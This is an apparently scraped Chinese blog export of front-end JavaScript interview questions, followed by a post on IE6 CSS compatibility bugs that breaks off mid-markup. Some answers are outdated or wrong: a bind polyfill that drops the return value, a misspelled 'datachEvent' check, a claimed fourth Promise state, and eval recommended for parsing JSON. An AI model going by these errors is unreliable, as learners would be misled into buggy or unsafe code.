闭包的特性： 函数内再嵌套函数 内部函数可以引用外层的参数和变量 参数和变量不会被垃圾回收机制回收 说说你对闭包的理解 使用闭包主要是为了设计私有的方法和变量。闭包的优点是可以避免全局变量的污染，缺点是闭包会常驻内存，会增大内存使用量，使用不当很容易造成内存泄露。在js中，函数即闭包，只有函数才会产生作用域的概念 闭包 的最大用处有两个，一个是可以读取函数内部的变量，另一个就是让这些变量始终保持在内存中 闭包的另一个用处，是封装对象的私有属性和私有方法 好处：能够实现封装和缓存等； 坏处：就是消耗内存、不正当使用会造成内存溢出的问题 使用闭包的注意点 由于闭包会使得函数中的变量都被保存在内存中，内存消耗很大，所以不能滥用闭包，否则会造成网页的性能问题，在IE中可能导致内存泄露 解决方法是，在退出函数之前，将不使用的局部变量全部删除 2、说说你对作用域链的理解 作用域链的作用是保证执行环境里有权访问的变量和函数是有序的，作用域链的变量只能向上访问，变量访问到window对象即被终止，作用域链向下访问变量是不被允许的 简单的说，作用域就是变量与函数的可访问范围，即作用域控制着变量与函数的可见性和生命周期 3、JavaScript原型，原型链 ? 有什么特点？ 每个对象都会在其内部初始化一个属性，就是prototype(原型)，当我们访问一个对象的属性时 如果这个对象内部不存在这个属性，那么他就会去prototype里找这个属性，这个prototype又会有自己的prototype，于是就这样一直找下去，也就是我们平时所说的原型链的概念 关系：instance.constructor.prototype = instance.__proto__ 特点： JavaScript对象是通过引用来传递的，我们创建的每个新对象实体中并没有一份属于自己的原型副本。当我们修改原型时，与之相关的对象也会继承这一改变 当我们需要一个属性的时，Javascript引擎会先看当前对象中是否有这个属性， 如果没有的 就会查找他的Prototype对象是否有这个属性，如此递推下去，一直检索到 Object 内建对象 4、请解释什么是事件代理 事件代理（Event Delegation），又称之为事件委托。是 JavaScript 中常用绑定事件的常用技巧。顾名思义，“事件代理”即是把原本需要绑定的事件委托给父元素，让父元素担当事件监听的职务。事件代理的原理是DOM元素的事件冒泡。使用事件代理的好处是可以提高性能 可以大量节省内存占用，减少事件注册，比如在table上代理所有td的click事件就非常棒 可以实现当新增子对象时无需再次对其绑定 5、Javascript如何实现继承？ 构造继承 原型继承 实例继承 拷贝继承 原型prototype机制或apply和call方法去实现较简单，建议使用构造函数与原型混合方式 12345678910111213function Parent()&#123; this.name = 'wang'; &#125; function Child()&#123; this.age = 28; &#125; Child.prototype = new Parent();//继承了Parent，通过原型 var demo = new Child(); alert(demo.age); alert(demo.name);//得到被继承的属性 &#125; 6、谈谈This对象的理解 this总是指向函数的直接调用者（而非间接调用者） 如果有new关键字，this指向new出来的那个对象 在事件中，this指向触发这个事件的对象，特殊的是，IE中的attachEvent中的this总是指向全局对象Window 7、事件模型 W3C中定义事件的发生经历三个阶段：捕获阶段（capturing）、目标阶段（targetin）、冒泡阶段（bubbling） 冒泡型事件：当你使用事件冒泡时，子级元素先触发，父级元素后触发 捕获型事件：当你使用事件捕获时，父级元素先触发，子级元素后触发 DOM事件流：同时支持两种事件模型：捕获型事件和冒泡型事件 阻止冒泡：在W3c中，使用stopPropagation（）方法；在IE下设置cancelBubble = true 阻止捕获：阻止事件的默认行为，例如click - &lt;a&gt;后的跳转。在W3c中，使用preventDefault（）方法，在IE下设置window.event.returnValue = false 8、new操作符具体干了什么呢? 创建一个空对象，并且 this 变量引用该对象，同时还继承了该函数的原型 属性和方法被加入到 this 引用的对象中 新创建的对象由 this 所引用，并且最后隐式的返回 this 9、Ajax原理 Ajax的原理简单来说是在用户和服务器之间加了—个中间层(AJAX引擎)，通过XmlHttpRequest对象来向服务器发异步请求，从服务器获得数据，然后用javascript来操作DOM而更新页面。使用户操作与服务器响应异步化。这其中最关键的一步就是从服务器获得请求数据 Ajax的过程只涉及JavaScript、XMLHttpRequest和DOM。XMLHttpRequest是ajax的核心机制 1234567891011121314151617// 1. 创建连接 var xhr = null; xhr = new XMLHttpRequest() // 2. 连接服务器 xhr.open('get', url, true) // 3. 发送请求 xhr.send(null); // 4. 接受请求 xhr.onreadystatechange = function()&#123; if(xhr.readyState == 4)&#123; if(xhr.status == 200)&#123; success(xhr.responseText); &#125; else &#123; // fail fail &amp;&amp; fail(xhr.status); &#125; &#125; &#125; ajax 有那些优缺点? 优点： 通过异步模式，提升了用户体验. 优化了浏览器和服务器之间的传输，减少不必要的数据往返，减少了带宽占用. Ajax在客户端运行，承担了一部分本来由服务器承担的工作，减少了大用户量下的服务器负载。 Ajax可以实现动态不刷新（局部刷新） 缺点： 安全问题 AJAX暴露了与服务器交互的细节。 对搜索引擎的支持比较弱。 不容易调试。 10、如何解决跨域问题? jsonp、 iframe、window.name、window.postMessage、服务器上设置代理页面 11、模块化开发怎么做？ 立即执行函数,不暴露私有成员 12345678910111213var module1 = (function()&#123; var _count = 0; var m1 = function()&#123; //... &#125;; var m2 = function()&#123; //... &#125;; return &#123; m1 : m1, m2 : m2 &#125;; &#125;)(); 12、异步加载JS的方式有哪些？ defer，只支持IE async： 创建script，插入到DOM中，加载完毕后callBack 13、那些操作会造成内存泄漏？ 内存泄漏指任何对象在您不再拥有或需要它之后仍然存在 setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏 闭包使用不当 14、XML和JSON的区别？ 数据体积方面 JSON相对于XML来讲，数据的体积小，传递的速度更快些。 数据交互方面 JSON与JavaScript的交互更加方便，更容易解析处理，更好的数据交互 数据描述方面 JSON对数据的描述性比XML较差 传输速度方面 JSON的速度要远远快于XML 15、谈谈你对webpack的看法 WebPack 是一个模块打包工具，你可以使用WebPack管理你的模块依赖，并编绎输出模块们所需的静态文件。它能够很好地管理、打包Web开发中所用到的HTML、Javascript、CSS以及各种静态文件（图片、字体等），让开发过程更加高效。对于不同类型的资源，webpack有对应的模块加载器。webpack模块打包器会分析模块间的依赖关系，最后 生成了优化且合并后的静态资源 16、说说你对AMD和Commonjs的理解 CommonJS是服务器端模块的规范，Node.js采用了这个规范。CommonJS规范加载模块是同步的，也就是说，只有加载完成，才能执行后面的操作。AMD规范则是非同步加载模块，允许指定回调函数 AMD推荐的风格通过返回一个对象做为模块对象，CommonJS的风格通过对module.exports或exports的属性赋值来达到暴露模块对象的目的 17、常见web安全及防护原理 sql注入原理 就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令 总的来说有以下几点 永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双&quot;-&quot;进行转换等 永远不要使用动态拼装SQL，可以使用参数化的SQL或者直接使用存储过程进行数据查询存取 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接 不要把机密信息明文存放，请加密或者hash掉密码和敏感的信息 XSS原理及防范 Xss(cross-site scripting)攻击指的是攻击者往Web页面里插入恶意html标签或者javascript代码。比如：攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取cookie中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器中，而不是用户原本以为的信任站点 XSS防范方法 首先代码里对用户输入的地方和变量都需要仔细检查长度和对”&lt;”,”&gt;”,”;”,”’”等字符做过滤；其次任何内容写到页面之前都必须加以encode，避免不小心把html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击 XSS与CSRF有什么区别吗？ XSS是获取信息，不需要提前知道其他用户页面的代码和数据包。CSRF是代替用户完成指定的动作，需要知道其他用户页面的代码和数据包。要完成一次CSRF攻击，受害者必须依次完成两个步骤 登录受信任网站A，并在本地生成Cookie 在不登出A的情况下，访问危险网站B CSRF的防御 服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数 通过验证码的方法 18、用过哪些设计模式？ 工厂模式： 工厂模式解决了重复实例化的问题，但还有一个问题,那就是识别问题，因为根本无法 主要好处就是可以消除对象间的耦合，通过使用工程方法而不是new关键字 构造函数模式 使用构造函数的方法，即解决了重复实例化的问题，又解决了对象识别的问题，该模式与工厂模式的不同之处在于 直接将属性和方法赋值给 this对象; 19、为什么要有同源限制？ 同源策略指的是：协议，域名，端口相同，同源策略是一种安全协议 举例说明：比如一个黑客程序，他利用Iframe把真正的银行登录页面嵌到他的页面上，当你使用真实的用户名，密码登录时，他的页面就可以通过Javascript读取到你的表单中input中的内容，这样用户名，密码就轻松到手了。 20、offsetWidth/offsetHeight,clientWidth/clientHeight与scrollWidth/scrollHeight的区别 offsetWidth/offsetHeight返回值包含content + padding + border，效果与e.getBoundingClientRect()相同 clientWidth/clientHeight返回值只包含content + padding，如果有滚动条，也不包含滚动条 scrollWidth/scrollHeight返回值包含content + padding + 溢出内容的尺寸 21、javascript有哪些方法定义对象 对象字面量： var obj = {}; 构造函数： var obj = new Object(); Object.create(): var obj = Object.create(Object.prototype); 22、常见兼容性问题？ png24位的图片在iE6浏览器上出现背景，解决方案是做成PNG8 浏览器默认的margin和padding不同。解决方案是加一个全局的*{margin:0;padding:0;}来统一,，但是全局效率很低，一般是如下这样解决： 1234body,ul,li,ol,dl,dt,dd,form,input,h1,h2,h3,h4,h5,h6,p&#123;margin:0;padding:0;&#125; IE下,event对象有x,y属性,但是没有pageX,pageY属性 Firefox下,event对象有pageX,pageY属性,但是没有x,y属性. 22、说说你对promise的了解 依照 Promise/A+ 的定义，Promise 有四种状态： pending: 初始状态, 非 fulfilled 或 rejected. fulfilled: 成功的操作. rejected: 失败的操作. settled: Promise已被fulfilled或rejected，且不是pending 另外， fulfilled与 rejected一起合称 settled Promise 对象用来进行延迟(deferred) 和异步(asynchronous) 计算 Promise 的构造函数 构造一个 Promise，最基本的用法如下： 123456789101112var promise = new Promise(function(resolve, reject) &#123; if (...) &#123; // succeed resolve(result); &#125; else &#123; // fails reject(Error(errMessage)); &#125; &#125;); Promise 实例拥有 then 方法（具有 then 方法的对象，通常被称为thenable）。它的使用方法如下： 1promise.then(onFulfilled, onRejected) 接收两个函数作为参数，一个在 fulfilled 的时候被调用，一个在rejected的时候被调用，接收参数就是 future，onFulfilled 对应resolve, onRejected对应 reject 23、你觉得jQuery源码有哪些写的好的地方 jquery源码封装在一个匿名函数的自执行环境中，有助于防止变量的全局污染，然后通过传入window对象参数，可以使window对象作为局部变量使用，好处是当jquery中访问window对象的时候，就不用将作用域链退回到顶层作用域了，从而可以更快的访问window对象。同样，传入undefined参数，可以缩短查找undefined时的作用域链 jquery将一些原型属性和方法封装在了jquery.prototype中，为了缩短名称，又赋值给了jquery.fn，这是很形象的写法 有一些数组或对象的方法经常能使用到，jQuery将其保存为局部变量以提高访问速度 jquery实现的链式调用可以节约代码，所返回的都是同一个对象，可以提高代码效率 24、vue、react、angular Vue.js一个用于创建 web 交互界面的库，是一个精简的 MVVM。它通过双向数据绑定把 View 层和 Model 层连接了起来。实际的 DOM 封装和输出格式都被抽象为了Directives 和 Filters AngularJS是一个比较完善的前端MVVM框架，包含模板，数据双向绑定，路由，模块化，服务，依赖注入等所有功能，模板功能强大丰富，自带了丰富的 Angular指令 reactReact 仅仅是 VIEW 层是facebook公司。推出的一个用于构建UI的一个库，能够实现服务器端的渲染。用了virtual dom，所以性能很好。 25、Node的应用场景 特点： 1、它是一个Javascript运行环境 2、依赖于Chrome V8引擎进行代码解释 3、事件驱动 4、非阻塞I/O 5、单进程，单线程 优点： 高并发（最重要的优点） 缺点： 1、只支持单核CPU，不能充分利用CPU 2、可靠性低，一旦代码某个环节崩溃，整个系统都崩溃 26、谈谈你对AMD、CMD的理解 CommonJS是服务器端模块的规范，Node.js采用了这个规范。CommonJS规范加载模块是同步的，也就是说，只有加载完成，才能执行后面的操作。AMD规范则是非同步加载模块，允许指定回调函数 AMD推荐的风格通过返回一个对象做为模块对象，CommonJS的风格通过对module.exports或exports的属性赋值来达到暴露模块对象的目的 27、那些操作会造成内存泄漏？ 内存泄漏指任何对象在您不再拥有或需要它之后仍然存在 setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏 闭包、控制台日志、循环（在两个对象彼此引用且彼此保留时，就会产生一个循环） 28、web开发中会话跟踪的方法有哪些 cookie session url重写 隐藏input ip地址 29、介绍js的基本数据类型 Undefined、Null、Boolean、Number、String 30、介绍js有哪些内置对象？ Object 是 JavaScript 中所有对象的父对象 数据封装类对象：Object、Array、Boolean、Number 和 String 其他对象：Function、Arguments、Math、Date、RegExp、Error 31、说几条写JavaScript的基本规范？ 不要在同一行声明多个变量 请使用===/!==来比较true/false或者数值 使用对象字面量替代new Array这种形式 不要使用全局函数 Switch语句必须带有default分支 If语句必须使用大括号 for-in循环中的变量 应该使用var关键字明确限定作用域，从而避免作用域污 32、JavaScript有几种类型的值？，你能画一下他们的内存图吗？ 栈：原始数据类型（Undefined，Null，Boolean，Number、String） 堆：引用数据类型（对象、数组和函数） 两种类型的区别是：存储位置不同； 原始数据类型直接存储在栈(stack)中的简单数据段，占据空间小、大小固定，属于被频繁使用数据，所以放入栈中存储； 引用数据类型存储在堆(heap)中的对象,占据空间大、大小不固定,如果存储在栈中，将会影响程序运行的性能；引用数据类型在栈中存储了指针，该指针指向堆中该实体的起始地址。当解释器寻找引用值时，会首先检索其 在栈中的地址，取得地址后从堆中获得实体 33、javascript创建对象的几种方式？ javascript创建对象简单的说,无非就是使用内置对象或各种自定义对象，当然还可以用JSON；但写法有很多种，也能混合使用 对象字面量的方式 1person=&#123;firstname:\"Mark\",lastname:\"Yun\",age:25,eyecolor:\"black\"&#125;; 用function来模拟无参的构造函数 12345678 function Person()&#123;&#125; var person=new Person();//定义一个function，如果使用new\"实例化\",该function可以看作是一个Class person.name=\"Mark\"; person.age=\"25\"; person.work=function()&#123; alert(person.name+\" hello...\"); &#125;person.work(); 用function来模拟参构造函数来实现（用this关键字定义构造的上下文属性） 12345678910function Pet(name,age,hobby)&#123; this.name=name;//this作用域：当前对象 this.age=age; this.hobby=hobby; this.eat=function()&#123; alert(\"我叫\"+this.name+\",我喜欢\"+this.hobby+\",是个程序员\"); &#125; &#125; var maidou =new Pet(\"麦兜\",25,\"coding\");//实例化、创建对象 maidou.eat();//调用eat方法 用工厂方式来创建（内置对象） 1234567var wcDog =new Object(); wcDog.name=&quot;旺财&quot;; wcDog.age=3; wcDog.work=function()&#123; alert(&quot;我是&quot;+wcDog.name+&quot;,汪汪汪......&quot;); &#125; wcDog.work(); 用原型方式来创建 123456789function Dog()&#123; &#125; Dog.prototype.name=&quot;旺财&quot;; Dog.prototype.eat=function()&#123; alert(this.name+&quot;是个吃货&quot;); &#125; var wangcai =new Dog(); wangcai.eat(); 用混合方式来创建 123456789function Car(name,price)&#123; this.name=name; this.price=price; &#125; Car.prototype.sell=function()&#123; alert(&quot;我是&quot;+this.name+&quot;，我现在卖&quot;+this.price+&quot;万元&quot;); &#125; var camry =new Car(&quot;凯美瑞&quot;,27); camry.sell(); 34、eval是做什么的？ 它的功能是把对应的字符串解析成JS代码并运行 应该避免使用eval，不安全，非常耗性能（2次，一次解析成js语句，一次执行） 由JSON字符串转换为JSON对象的时候可以用eval，var obj =eval(&#39;(&#39;+ str +&#39;)&#39;) 35、null，undefined 的区别？ undefined 表示不存在这个值。 undefined :是一个表示”无”的原始值或者说表示”缺少值”，就是此处应该有一个值，但是还没有定义。当尝试读取时会返回 undefined 例如变量被声明了，但没有赋值时，就等于undefined null 表示一个对象被定义了，值为“空值” null : 是一个对象(空对象, 没有任何属性和方法) 例如作为函数的参数，表示该函数的参数不是对象； 在验证null时，一定要使用 === ，因为 ==无法分别null 和 undefined 36、[“1”, “2”, “3”].map(parseInt) 答案是多少？ [1, NaN, NaN]因为 parseInt 需要两个参数 (val, radix)，其中radix 表示解析时用的基数。 map传了 3个(element, index, array)，对应的 radix 不合法导致解析失败。 37、javascript 代码中的”use strict”;是什么意思 ? 使用它区别是什么？ use strict是一种ECMAscript 5 添加的（严格）运行模式,这种模式使得 Javascript 在更严格的条件下运行,使JS编码更加规范化的模式,消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为 38、JSON 的了解？** JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式 它是基于JavaScript的一个子集。数据格式简单, 易于读写, 占用带宽小 JSON字符串转换为JSON对象: 123var obj =eval(&apos;(&apos;+ str +&apos;)&apos;);var obj = str.parseJSON();var obj = JSON.parse(str); JSON对象转换为JSON字符串： 12var last=obj.toJSONString();var last=JSON.stringify(obj); 39、js延迟加载的方式有哪些？ defer和async、动态创建DOM方式（用得最多）、按需异步载入js 40、同步和异步的区别? 同步：浏览器访问服务器请求，用户看得到页面刷新，重新发请求,等请求完，页面刷新，新内容出现，用户看到新内容,进行下一步操作 异步：浏览器访问服务器请求，用户正常操作，浏览器后端进行请求。等请求完，页面不刷新，新内容也会出现，用户看到新内容 41、渐进增强和优雅降级 渐进增强 ：针对低版本浏览器进行构建页面，保证最基本的功能，然后再针对高级浏览器进行效果、交互等改进和追加功能达到更好的用户体验。 优雅降级 ：一开始就构建完整的功能，然后再针对低版本浏览器进行兼容 42、defer和async defer并行加载js文件，会按照页面上script标签的顺序执行 async并行加载js文件，下载完成立即执行，不会按照页面上script标签的顺序执行 43、说说严格模式的限制 变量必须声明后再使用 函数的参数不能有同名属性，否则报错 不能使用with语句 禁止this指向全局对象 44、attribute和property的区别是什么？ attribute是dom元素在文档中作为html标签拥有的属性； property就是dom元素在js中作为对象拥有的属性。 对于html的标准属性来说，attribute和property是同步的，是会自动更新的 但是对于自定义的属性来说，他们是不同步的 45、谈谈你对ES6的理解 新增模板字符串（为JavaScript提供了简单的字符串插值功能） 箭头函数 for-of（用来遍历数据—例如数组中的值。） arguments对象可被不定参数和默认参数完美代替。 ES6将promise对象纳入规范，提供了原生的Promise对象。 增加了let和const命令，用来声明变量。 增加了块级作用域。 let命令实际上就增加了块级作用域。 还有就是引入module模块的概念 46、ECMAScript6 怎么写class么，为什么会出现class这种东西? 这个语法糖可以让有OOP基础的人更快上手js，至少是一个官方的实现了 但对熟悉js的人来说，这个东西没啥大影响；一个Object.creat()搞定继承，比class简洁清晰的多 47、什么是面向对象编程及面向过程编程，它们的异同和优缺点 面向过程就是分析出解决问题所需要的步骤，然后用函数把这些步骤一步一步实现，使用的时候一个一个依次调用就可以了 面向对象是把构成问题事务分解成各个对象，建立对象的目的不是为了完成一个步骤，而是为了描叙某个事物在整个解决问题的步骤中的行为 面向对象是以功能来划分问题，而不是步骤 48、面向对象编程思想 基本思想是使用对象，类，继承，封装等基本概念来进行程序设计 优点 易维护 采用面向对象思想设计的结构，可读性高，由于继承的存在，即使改变需求，那么维护也只是在局部模块，所以维护起来是非常方便和较低成本的 易扩展 开发工作的重用性、继承性高，降低重复工作量。 缩短了开发周期 49、对web标准、可用性、可访问性的理解 可用性（Usability）：产品是否容易上手，用户能否完成任务，效率如何，以及这过程中用户的主观感受可好，是从用户的角度来看产品的质量。可用性好意味着产品质量高，是企业的核心竞争力 可访问性（Accessibility）：Web内容对于残障用户的可阅读和可理解性 可维护性（Maintainability）：一般包含两个层次，一是当系统出现问题时，快速定位并解决问题的成本，成本低则可维护性好。二是代码是否容易被人理解，是否容易修改和增强功能。 $编程题1、写一个通用的事件侦听器函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// event(事件)工具集，来源：github.com/markyun markyun.Event = &#123; // 视能力分别使用dom0||dom2||IE方式 来绑定事件 // 参数： 操作的元素,事件名称 ,事件处理程序 addEvent : function(element, type, handler) &#123; if (element.addEventListener) &#123; //事件类型、需要执行的函数、是否捕捉 element.addEventListener(type, handler, false); &#125; else if (element.attachEvent) &#123; element.attachEvent('on' + type, function() &#123; handler.call(element); &#125;); &#125; else &#123; element['on' + type] = handler; &#125; &#125;, // 移除事件 removeEvent : function(element, type, handler) &#123; if (element.removeEventListener) &#123; element.removeEventListener(type, handler, false); &#125; else if (element.datachEvent) &#123; element.detachEvent('on' + type, handler); &#125; else &#123; element['on' + type] = null; &#125; &#125;, // 阻止事件 (主要是事件冒泡，因为IE不支持事件捕获) stopPropagation : function(ev) &#123; if (ev.stopPropagation) &#123; ev.stopPropagation(); &#125; else &#123; ev.cancelBubble = true; &#125; &#125;, // 取消事件的默认行为 preventDefault : function(event) &#123; if (event.preventDefault) &#123; event.preventDefault(); &#125; else &#123; event.returnValue = false; &#125; &#125;, // 获取事件目标 getTarget : function(event) &#123; return event.target || event.srcElement; &#125; 2、如何判断一个对象是否为数组123456function isArray(arg) &#123; if (typeof arg === 'object') &#123; return Object.prototype.toString.call(arg) === '[object Array]'; &#125; return false;&#125; 3、冒泡排序 每次比较相邻的两个数，如果后一个比前一个小，换位置 1234567891011121314151617var arr = [3, 1, 4, 6, 5, 7, 2];function bubbleSort(arr) &#123;for (var i = 0; i &lt; arr.length - 1; i++) &#123; for(var j = 0; j &lt; arr.length - 1; j++) &#123; if(arr[j + 1] &lt; arr[j]) &#123; var temp; temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; &#125; &#125;&#125;return arr;&#125;console.log(bubbleSort(arr)); 4、快速排序 采用二分法，取出中间数，数组每次和中间数比较，小的放到左边，大的放到右边 123456789101112131415161718192021222324var arr = [3, 1, 4, 6, 5, 7, 2];function quickSort(arr) &#123; if(arr.length == 0) &#123; return []; // 返回空数组 &#125; var cIndex = Math.floor(arr.length / 2); var c = arr.splice(cIndex, 1); var l = []; var r = []; for (var i = 0; i &lt; arr.length; i++) &#123; if(arr[i] &lt; c) &#123; l.push(arr[i]); &#125; else &#123; r.push(arr[i]); &#125; &#125; return quickSort(l).concat(c, quickSort(r));&#125;console.log(quickSort(arr)); 5、编写一个方法 求一个字符串的字节长度 假设：一个英文字符占用一个字节，一个中文字符占用两个字节 1234567891011121314151617function GetBytes(str)&#123; var len = str.length; var bytes = len; for(var i=0; i&lt;len; i++)&#123; if (str.charCodeAt(i) &gt; 255) bytes++; &#125; return bytes; &#125;alert(GetBytes(\"你好,as\")); 6、bind的用法，以及如何实现bind的函数和需要注意的点 bind的作用与call和apply相同，区别是call和apply是立即调用函数，而bind是返回了一个函数，需要调用的时候再执行。一个简单的bind函数实现如下 123456Function.prototype.bind = function(ctx) &#123; var fn = this; return function() &#123; fn.apply(ctx, arguments); &#125;;&#125;; $其他1、谈谈你对重构的理解 网站重构：在不改变外部行为的前提下，简化结构、添加可读性，而在网站前端保持一致的行为。也就是说是在不改变UI的情况下，对网站进行优化， 在扩展的同时保持一致的UI 对于传统的网站来说重构通常是： 表格(table)布局改为DIV+CSS 使网站前端兼容于现代浏览器(针对于不合规范的CSS、如对IE6有效的) 对于移动平台的优化 针对于SEO进行优化 2、什么样的前端代码是好的 高复用低耦合，这样文件小，好维护，而且好扩展。 3、对前端工程师这个职位是怎么样理解的？它的前景会怎么样？ 前端是最贴近用户的程序员，比后端、数据库、产品经理、运营、安全都近 实现界面交互 提升用户体验 有了Node.js，前端可以实现服务端的一些事情 前端是最贴近用户的程序员，前端的能力就是能让产品从 90分进化到 100 分，甚至更好， 与团队成员，UI设计，产品经理的沟通； 做好的页面结构，页面重构和用户体验； 4、你觉得前端工程的价值体现在哪 为简化用户使用提供技术支持（交互部分） 为多个浏览器兼容性提供支持 为提高用户浏览速度（浏览器性能）提供支持 为跨平台或者其他基于webkit或其他渲染引擎的应用提供支持 为展示数据提供支持（数据接口） 5、平时如何管理你的项目？ 先期团队必须确定好全局样式（globe.css），编码模式(utf-8) 等； 编写习惯必须一致（例如都是采用继承式的写法，单样式都写成一行）； 标注样式编写人，各模块都及时标注（标注关键样式调用的地方）； 页面进行标注（例如 页面 模块 开始和结束）； CSS跟HTML 分文件夹并行存放，命名都得统一（例如style.css）； JS 分文件夹存放 命名以该JS功能为准的英文翻译。 图片采用整合的 images.png png8 格式文件使用 - 尽量整合在一起使用方便将来的管理 人事面 面试完你还有什么问题要问的吗 你有什么爱好? 你最大的优点和缺点是什么? 你为什么会选择这个行业，职位? 你觉得你适合从事这个岗位吗? 你有什么职业规划? 你对工资有什么要求? 如何看待前端开发？ 未来三到五年的规划是怎样的？ 常问 自我介绍 你的项目中技术难点是什么？遇到了什么问题？你是怎么解决的？ 你认为哪个项目做得最好？ 最近在看哪些前端方面的书？ 平时是如何学习前端开发的？ 你最有成就感的一件事 你是怎么学习前端的","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"面试","slug":"面试","permalink":"https://ru23.com/tags/面试/"}]},{"title":"IE6下常见的兼容性问题","slug":"2017-02-ie-compatibility-summary","date":"2017-02-07T03:10:43.000Z","updated":"2018-10-24T03:46:02.073Z","comments":true,"path":"note/12cd9bda.html","link":"","permalink":"https://ru23.com/note/12cd9bda.html","excerpt":"常见问题一：在Ie6下，内容会把父元素设置好的宽高撑开。计算一定要精确 1234567891011121314151617181920.box&#123; width:400px;&#125;.left&#123; width:200px; height:210px; background:red; float:left&#125;.right&#123; width:200px; float:right; overflow:hidden;&#125;.div&#123; width:180px; height:180px; background:blue; padding:25px;&#125; 123456&lt;div class=\"box\"&gt; &lt;div class=\"left\"&gt;&lt;/div&gt; &lt;div class=\"right\"&gt; &lt;div class=\"div\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt;","text":"常见问题一：在Ie6下，内容会把父元素设置好的宽高撑开。计算一定要精确 1234567891011121314151617181920.box&#123; width:400px;&#125;.left&#123; width:200px; height:210px; background:red; float:left&#125;.right&#123; width:200px; float:right; overflow:hidden;&#125;.div&#123; width:180px; height:180px; background:blue; padding:25px;&#125; 123456&lt;div class=\"box\"&gt; &lt;div class=\"left\"&gt;&lt;/div&gt; &lt;div class=\"right\"&gt; &lt;div class=\"div\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 常见问题二：在IE6元素浮动，如果宽度需要内容撑开，里面块级元素的内容也要加浮动 123456789101112131415.box&#123; width:400px;&#125;.left&#123; background:red; float:left;&#125;.right&#123; background:blue; float:right;&#125;h3&#123; height:30px; float:left;&#125; 12345678 &lt;div class=\"box\"&gt; &lt;div class=\"left\"&gt; &lt;h3&gt;左侧&lt;/h3&gt; &lt;/div&gt; &lt;div class=\"right\"&gt; &lt;h3&gt;右侧&lt;/h3&gt; &lt;/div&gt;&lt;/div&gt; 常见问题三：p里面不要套用p标签或者标题标签 常见问题四：IE6下最小高度问题 当height&lt;19px的时候会被当作19px来处理 解决办法：overflow:hidden 1234567.box&#123; height:2px; background:red; overflow:hidden&#125;&lt;div class=\"box\"&gt;&lt;/div&gt; 常见问题五：border:1px dotted; IE6不支持 解决办法：切背景平铺 12345678.box&#123; width:100px; height:100px; border:1px dotted red; margin:100px auto;&#125; &lt;div class=\"box\"&gt;&lt;/div&gt; 常见问题六：IE6下，父元素用边框，子元素的margin会消失 解决办法：触发父元素的haslayout; 123456789101112.box&#123; background:red; border:1px solid red; zoom:1; /*padding:1px;*/&#125;.div&#123; width:200px; height:200px; background:blue; margin:100px&#125; 123&lt;div class=\"box\"&gt; &lt;div class=\"div\"&gt;&lt;/div&gt;&lt;/div&gt; 常见问题七：IE6双边距bug：横向的margin值会被放大为两倍 解决方法：display:inline; 12345678910.box&#123; width:200px; height:200px; background:red; float:left; margin:100px; display:inline;&#125; &lt;div class=\"box\"&gt;&lt;/div&gt; 常见问题八：IE6下外边距消失：当父元素的宽度和一行内容的宽度的差别&gt;3px的时候 IE6双边距bug：横向的margin值会被放大为两倍 解决方法：display:inline; 123456789101112131415161718192021222324.box&#123; float:left; border:10px solid #000; width:600px;&#125;.box div&#123; width:100px; height:100px; background:red; margin:20px; border:5px solid blue; float:left; display:inline;&#125;&lt;div class=\"box\"&gt; &lt;div&gt;1&lt;/div&gt; &lt;div&gt;2&lt;/div&gt; &lt;div&gt;3&lt;/div&gt; &lt;div&gt;4&lt;/div&gt; &lt;div&gt;1&lt;/div&gt; &lt;div&gt;2&lt;/div&gt; &lt;div&gt;3&lt;/div&gt; &lt;div&gt;3&lt;/div&gt;&lt;/div&gt; 常见问题九：IE6，7下 li本身没有浮动，但是li里面的内容有浮动，每个li下边就会产生一个间距 解决办法： 1、给li添加 vertical-align:top 2、给li添加浮动 123456789101112131415161718192021ul&#123; width:&#125;li&#123; list-style:none; height:30px; border:1px solid #000; /*vertical-align:top*/;float:left;&#125;a&#123; width:100px; height:30px; float:left; background:red;&#125;span&#123; width:100px; height:30px; float:right; background:blue;&#125; 12345678910111213141516171819202122&lt;ul&gt; &lt;li&gt; &lt;a href=\"#\"&gt;&lt;/a&gt; &lt;span&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=\"#\"&gt;&lt;/a&gt; &lt;span&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=\"#\"&gt;&lt;/a&gt; &lt;span&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=\"#\"&gt;&lt;/a&gt; &lt;span&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=\"#\"&gt;&lt;/a&gt; &lt;span&gt;&lt;/span&gt; &lt;/li&gt;&lt;ul&gt; 常见问题十：IE6，7下面让两个块级元素在一行内显示 都用浮动 1234&lt;div class=\"box\"&gt; &lt;div class=\"left\"&gt;&lt;/div&gt; &lt;div class=\"right\"&gt;&lt;/div&gt;&lt;/div&gt; 1234567891011121314151617181920212223242526272829303132333435*&#123;margin:0px;padding:0px;&#125;.left&#123; width:100px; height:100px; float:left; background:red;&#125;.right&#123; width:200px; height:100px; background:blue; float:left;/*margin-left:100px;*/&#125;``` #### 常见问题十一：IE6下的文字溢出---&gt; 子元素的宽度和父元素的宽度相差小于3px的时候，两个浮动元素之间有注释或者行内元素的时候- 解决办法：用div把注释和行内元素包裹起来```css*&#123;margin:0px;padding:0px;&#125;.box&#123; width:400px;&#125;.left&#123; float:left;&#125;.right&#123; width:400px; float:right&#125; 12345&lt;div class=\"box\"&gt; &lt;div 